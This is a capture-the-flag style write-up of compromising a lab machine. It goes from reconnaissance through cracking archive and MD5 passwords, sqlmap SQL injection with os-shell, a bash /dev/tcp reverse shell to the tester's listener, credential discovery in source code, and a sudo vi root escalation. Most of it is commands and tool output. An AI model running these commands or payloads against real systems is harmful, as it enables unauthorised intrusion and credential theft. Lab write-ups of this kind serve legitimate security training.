# Enumeration

```shell
sudo nmap -sV -sC 10.129.66.225 -o nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 19:21 CEST
Nmap scan report for 10.129.66.225
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.78
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
```

Connect to ftp with anonymous account and get backup.zip file. Zip is password protected, get hash zip file:
```shell
└──╼ $zip2john backup.zip > hashes
Created directory: /home/darthv/.john
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Brute force with john hash file:
```shell
└──╼ $john -wordlist=./rockyou.txt hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2022-08-22 19:32) 16.66g/s 136533p/s 136533c/s 136533C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Lets unzip file with 741852963 password:
```shell
└──╼ $unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css               
└──╼ $
```

Lets crack md5 password detected on index.php:
```shell
└──╼ $grep md5 index.php 
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
└──╼ $
└──╼ $hashid 2cb42f8734ea607eefed3b70af13bbd3
Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 


└──╼ $hashcat -a 0 -m 0 hash ./rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 5653/5717 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: ./rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

2cb42f8734ea607eefed3b70af13bbd3:qwerty789       
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3
Time.Started.....: Mon Aug 22 19:36:37 2022 (0 secs)
Time.Estimated...: Mon Aug 22 19:36:37 2022 (0 secs)
Guess.Base.......: File (./rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1144.8 kH/s (0.30ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 102400/14344385 (0.71%)
Rejected.........: 0/102400 (0.00%)
Restore.Point....: 98304/14344385 (0.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Dominic1 -> birth

Started: Mon Aug 22 19:36:14 2022
Stopped: Mon Aug 22 19:36:38 2022
```
Lets login on the web page with admin/qwerty789

By checking the search URL, we can see that there is a variable $search which is responsible for searching through
catalogue. We could test it to see if it's SQL injectable, but instead of doing it manually, we will use a tool
called sqlmap

We will provide the URL & the cookie to the sqlmap in order for it to find vulnerability. The reason why we
have to provide a cookie is because of authentication:
To grab the cookie, we can intercept any request in Burp Suite & get it from there, however, you can install a
great extension for your web browser called cookie-editor 

With cookie value from cookie-editor addon, run sqlmap against search url:
```shell
└──╼ $sqlmap -u http://10.129.66.225/dashboard.php?search= --cookie="PHPSESSID=39vek9179nd13mpflb2kio4nok"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.8#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:53:13 /2022-08-22/

[19:53:13] [WARNING] provided value for parameter 'search' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[19:53:13] [INFO] testing connection to the target URL
[19:53:13] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:53:14] [INFO] testing if the target URL content is stable
[19:53:14] [INFO] target URL content is stable
[19:53:14] [INFO] testing if GET parameter 'search' is dynamic
[19:53:14] [INFO] GET parameter 'search' appears to be dynamic
[19:53:14] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[19:53:14] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[19:53:14] [INFO] testing for SQL injection on GET parameter 'search'
[19:53:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:53:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:53:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:53:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:53:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:53:16] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:53:16] [INFO] testing 'Generic inline queries'
[19:53:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:53:26] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
```

search is injectable, let's go to command injection with --os-shell, and after open reverseshell:

On our workstation:
```shell
└──╼ $sudo nc -lvnp 443
[sudo] password : 
listening on [any] 443 ...
```

On server side:
```shell
└──╼ $sqlmap -u http://10.129.66.225/dashboard.php?search= --cookie="PHPSESSID=39vek9179nd13mpflb2kio4nok" --os-shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.8#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:59:16 /2022-08-22/

[19:59:16] [WARNING] provided value for parameter 'search' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[19:59:16] [INFO] resuming back-end DBMS 'postgresql' 
[19:59:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(122)||CHR(112)||CHR(113))||(CHR(82)||CHR(69)||CHR(78)||CHR(112)||CHR(108)||CHR(114)||CHR(73)||CHR(66)||CHR(72)||CHR(103)||CHR(114)||CHR(81)||CHR(77)||CHR(67)||CHR(89)||CHR(105)||CHR(84)||CHR(70)||CHR(111)||CHR(116)||CHR(112)||CHR(85)||CHR(76)||CHR(80)||CHR(72)||CHR(87)||CHR(105)||CHR(82)||CHR(78)||CHR(72)||CHR(118)||CHR(88)||CHR(78)||CHR(106)||CHR(100)||CHR(67)||CHR(100)||CHR(112)||CHR(109)||CHR(119))||(CHR(113)||CHR(113)||CHR(122)||CHR(98)||CHR(113)),NULL-- Ajif
---
[19:59:17] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[19:59:17] [INFO] fingerprinting the back-end DBMS operating system
[19:59:17] [WARNING] reflective value(s) found and filtering out
[19:59:17] [INFO] the back-end DBMS operating system is Linux
[19:59:17] [INFO] testing if current user is DBA
[19:59:17] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[19:59:17] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.78/443 0>&1" 
```

We will go back to our listener to see if we got the connection:
We will quickly make our shell fully interactive:
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

# Privilege Escalation

Find postgre credentials on:
```shell
postgres@vaccine:/var/www/html$ grep pg_connect dashboard.php
	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
postgres@vaccine:/var/www/html$ 
```

check sudo -l:
```shell
postgres@vaccine:/var/www/html$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:/var/www/html$ 
```
[gtfobinx vi sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)
Open root shell with vi:
```shell
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:set shell=/bin/sh
:shell
```
